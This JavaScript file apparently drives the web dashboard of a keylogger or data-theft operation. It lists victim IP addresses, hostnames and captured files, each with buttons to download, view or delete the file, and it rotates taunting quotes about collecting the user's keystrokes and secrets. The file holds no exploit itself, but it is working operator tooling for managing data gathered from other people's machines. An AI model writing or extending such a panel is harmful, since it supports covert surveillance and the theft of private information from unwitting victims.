// Array of quotes for random selection
const quotes = [
    "Hiding behind screens, we reveal our rawest selves.",
    "Typing in the dark, we illuminate our fears.",
    "Each message sent is a glimpse into a soul’s shadow.",
    "The typed word can bind us or set us free; it’s all in the intent.",
    "Every keystroke is a whisper of your secrets—none of which are safe.",
    "Behind the glow, our facades fade, revealing the chaos within.",
    "Sure, type away—your keyboard loves secrets almost as much as you do.",
    "Writing your feelings down? How original. That’ll solve everything, right?",
    "Type away; I’m just here to collect your secrets—no pressure.",
    "Feel free to vent—this little secret stays between us... and the internet."
];

// Function to select a random quote on page load
function displayRandomQuote() {
    const quoteElement = document.getElementById("quote");
    const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
    quoteElement.textContent = `"${randomQuote}"`;
}

// Function to fetch IP addresses and populate the table
async function populateIPTable() {
    const tableBody = document.getElementById("ipTable");
    try {
        const response = await fetch("http://127.0.0.1:1111/get_ips"); //change IP
        const fileData = await response.json();
        
        Object.keys(fileData).forEach(ip => {
            const {hostname, files } = fileData[ip];

            files.forEach(filename => {
                const row = document.createElement("tr");
            
                // IP Address cell
                const ipCell = document.createElement("td");
                ipCell.textContent = ip;
                row.appendChild(ipCell);

                // Hostname cell
                const hostnameCell = document.createElement("td");
                hostnameCell.textContent = hostname;
                row.appendChild(hostnameCell);

                // Filename cell
                const filenameCell = document.createElement("td");
                filenameCell.textContent = filename;
                row.appendChild(filenameCell);
                
                // Actions cell with buttons
                const actionCell = document.createElement("td");

                // Download button
                const downloadButton = document.createElement("button");
                downloadButton.classList.add("download-btn");
                downloadButton.textContent = "Download";
                downloadButton.onclick = () => window.open(`/download/${filename}`, '_blank');
                actionCell.appendChild(downloadButton);

                // Delete button
                const deleteButton = document.createElement("button");
                deleteButton.classList.add("delete-btn");
                deleteButton.textContent = "Delete";
                deleteButton.onclick = async () => {
                    const deleteResponse = await fetch(`/delete/${filename}`, { method: 'DELETE' });
                    if (deleteResponse.ok) {
                        alert("File deleted successfully");
                        row.remove(); // Remove row from the table
                    } else {
                        alert("Failed to delete file");
                    }
                };
                actionCell.appendChild(deleteButton);

                // View button
                const viewButton = document.createElement("button");
                viewButton.classList.add("view-btn");
                viewButton.textContent = "View";
                viewButton.onclick = () => window.open(`/view_file/${filename}`, '_blank');
                actionCell.appendChild(viewButton);

                row.appendChild(actionCell);
                tableBody.appendChild(row);
            }); // Closing bracket for files.forEach
        });
    } catch (error) {
        console.error("Error fetching file data:", error);
    }
}

// Initialize the quote and populate the table on page load
window.onload = function() {
    displayRandomQuote();
    populateIPTable();
};
